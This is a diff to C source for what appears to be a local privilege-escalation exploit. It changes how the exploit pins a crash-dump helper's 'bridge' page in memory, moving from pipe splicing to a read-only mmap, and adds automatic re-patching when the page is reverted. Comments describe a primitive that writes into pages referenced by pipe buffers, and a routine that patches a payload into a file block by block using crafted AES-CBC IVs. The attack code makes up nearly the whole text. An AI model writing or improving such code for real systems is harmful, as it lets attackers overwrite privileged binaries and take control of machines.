@@ -13,6 +13,7 @@
 #include <sys/wait.h>
 #include <sys/stat.h>
 #include <sys/utsname.h>
+#include <sys/mman.h>
 #include <netinet/in.h>
 #include <arpa/inet.h>
 #include "aes256.h"
@@ -76,21 +77,26 @@ static void compute_iv(const uint8_t old_content[16], const uint8_t desired[16],
  * off the LRU so the reclaim path cannot touch it. A second safety net is
  * bridge_is_ours(): if the page does get evicted we simply re-patch.
  */
-static int g_pin_rd = -1, g_pin_wr = -1;
+static void *g_pin_map = NULL;
 
+/* Soft pin: map the page read-only and fault it in, then keep the mapping.
+ * A pipe-based pin (splice one byte of the page into a pipe) keeps the page
+ * around too, but it also turns the page into a spliceable pipe page - and the
+ * ESP primitive writes in place into pages referenced by pipe buffers, which
+ * SEGV'd the helper mid-exec (status 0xb = killed by signal 11). A plain
+ * read-only mapping keeps the page referenced without exposing it that way. */
 static void pin_bridge(void)
 {
     int fd = open(kCrashDump, O_RDONLY);
     if (fd < 0) { printf("pin: open %s failed\n", kCrashDump); return; }
-    if (g_pin_rd < 0) {
-        int p[2];
-        if (pipe(p) < 0) { close(fd); return; }
-        g_pin_rd = p[0];
-        g_pin_wr = p[1];
+    if (!g_pin_map) {
+        void *m = mmap(NULL, 4096, PROT_READ, MAP_PRIVATE, fd, 0);
+        if (m == MAP_FAILED) { printf("pin: mmap failed: %s\n", strerror(errno)); close(fd); return; }
+        g_pin_map = m;
     }
-    off64_t off = 0;
-    ssize_t n = splice(fd, &off, g_pin_wr, NULL, 1, 0);
-    printf("pin: %s page0 -> %zd byte(s) held\n", kCrashDump, n);
+    volatile unsigned char c = ((volatile unsigned char *)g_pin_map)[0];
+    (void)c;
+    printf("pin: %s page0 mapped read-only\n", kCrashDump);
     close(fd);
 }
 
@@ -358,6 +364,13 @@ static int patch_file_cbc(const char *path, const char *payload, size_t len,
         off64_t off = (off64_t)(foff + i * 16);
         uint8_t old_content[16] = {0};
 
+        if (use_helper && !bridge_is_ours()) {
+            printf("bridge reverted at 0x%08lx%08lx, re-patching\n",
+                   (unsigned long)((uint64_t)off >> 32),
+                   (unsigned long)((uint64_t)off & 0xffffffffu));
+            if (patch_helper() != 0) { rc = -1; break; }
+            pin_bridge();
+        }
         if (use_helper) {
             int rv = -1;
             for (int t = 0; t < 4 && rv < 0; t++) {
